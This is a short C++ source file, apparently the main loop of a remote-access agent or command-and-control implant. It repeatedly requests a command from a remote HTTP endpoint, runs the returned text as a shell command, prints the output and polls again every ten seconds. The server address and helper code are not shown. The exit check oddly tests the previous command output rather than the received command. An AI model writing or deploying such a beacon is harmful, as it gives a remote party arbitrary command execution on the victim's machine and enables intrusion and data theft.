//
// Created by nicla on 20.10.2022.
//
#include <iostream>
#include "HTTP/SendRequest.h"
#include "ExecCLIFunction.h"
#include <chrono>
#include <thread>

using namespace std;

int main() {
    string out;

    while(1==1){
        string response = SendRequesth::SendCommandRequest();
        if (out == "exit")
            break;
        else
            out = ExecCLIFunction::exec(response);
        cout << out <<endl;
        this_thread::sleep_for(chrono::milliseconds(10000) );

    }
    return 0;
}
